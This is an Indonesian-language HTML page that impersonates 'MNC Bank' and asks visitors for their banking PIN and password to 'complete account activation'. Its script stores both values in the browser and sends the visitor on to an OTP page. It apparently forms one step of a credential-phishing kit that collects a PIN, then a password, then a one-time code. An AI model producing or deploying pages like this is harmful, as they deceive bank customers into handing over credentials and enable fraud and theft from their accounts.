<!DOCTYPE html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>PIN & Kode Sandi | MNC Bank</title>
    <style>
      :root {
        --bg: linear-gradient(135deg, #f5f7fb 0%, #edf3ff 100%);
        --card-bg: rgba(255, 255, 255, 0.96);
        --text: #1d2433;
        --muted: #5b6982;
        --primary: #d4a21f;
        --primary-dark: #b7860c;
        --border: #e6eaf1;
        --shadow: 0 18px 40px rgba(15, 23, 42, 0.12);
      }

      * { box-sizing: border-box; }

      html, body {
        margin: 0;
        min-height: 100%;
        font-family: Arial, sans-serif;
        background: var(--bg);
        color: var(--text);
      }

      body {
        display: grid;
        place-items: center;
        padding: 32px 16px;
      }

      .card {
        width: min(100%, 460px);
        background: var(--card-bg);
        border: 1px solid var(--border);
        border-radius: 20px;
        padding: 28px 24px;
        box-shadow: var(--shadow);
      }

      .brand {
        text-align: center;
        margin-bottom: 12px;
        font-size: 1.8rem;
        font-weight: 700;
        color: var(--primary-dark);
      }

      h1 {
        margin: 0 0 12px;
        font-size: clamp(1.5rem, 2vw, 2.1rem);
        text-align: center;
      }

      .subtitle {
        color: var(--muted);
        text-align: center;
        line-height: 1.6;
        margin: 0 0 24px;
      }

      form {
        display: grid;
        gap: 16px;
      }

      label {
        display: grid;
        gap: 8px;
        font-weight: 600;
      }

      input {
        width: 100%;
        padding: 12px 14px;
        border: 1px solid var(--border);
        border-radius: 12px;
        font-size: 1rem;
        transition: border-color 0.2s ease, box-shadow 0.2s ease;
      }

      input:focus {
        outline: none;
        border-color: var(--primary);
        box-shadow: 0 0 0 4px rgba(212, 162, 31, 0.15);
      }

      button {
        appearance: none;
        border: none;
        border-radius: 12px;
        background: var(--primary);
        color: #fff;
        font-size: 1rem;
        font-weight: 700;
        padding: 14px 18px;
        cursor: pointer;
        transition: transform 0.2s ease, background 0.2s ease;
      }

      button:hover {
        background: var(--primary-dark);
        transform: translateY(-1px);
      }

      .status {
        min-height: 24px;
        margin-top: 8px;
        font-size: 0.95rem;
        color: #d13b3b;
        text-align: center;
      }
    </style>
  </head>
  <body>
    <main class="card">
      <div class="brand">MNC Bank</div>
      <h1>PIN & Kode Sandi</h1>
      <p class="subtitle">
        Masukkan PIN dan kode sandi untuk menyelesaikan proses aktivasi akun Anda.
      </p>

      <form id="pinForm" novalidate>
        <label for="pin">
          PIN
          <input id="pin" name="pin" type="password" minlength="4" maxlength="6" placeholder="Masukkan PIN" required />
        </label>

        <label for="kodeSandi">
          Kode Sandi
          <input id="kodeSandi" name="kodeSandi" type="password" minlength="4" maxlength="8" placeholder="Masukkan kode sandi" required />
        </label>

        <button type="submit">Lanjut</button>
      </form>

      <p id="status" class="status" aria-live="polite"></p>
    </main>

    <script>
      const pinForm = document.getElementById('pinForm');
      const status = document.getElementById('status');

      pinForm.addEventListener('submit', (event) => {
        event.preventDefault();

        const pin = pinForm.pin.value.trim();
        const kodeSandi = pinForm.kodeSandi.value.trim();

        if (!pin || !kodeSandi) {
          status.textContent = 'Mohon isi PIN dan kode sandi dengan benar.';
          return;
        }

        const payload = {
          pin,
          kodeSandi
        };

        localStorage.setItem('mncPinData', JSON.stringify(payload));
        status.textContent = 'PIN berhasil disimpan.';
        window.location.href = 'otp.html';
      });
    </script>
  </body>
</html>
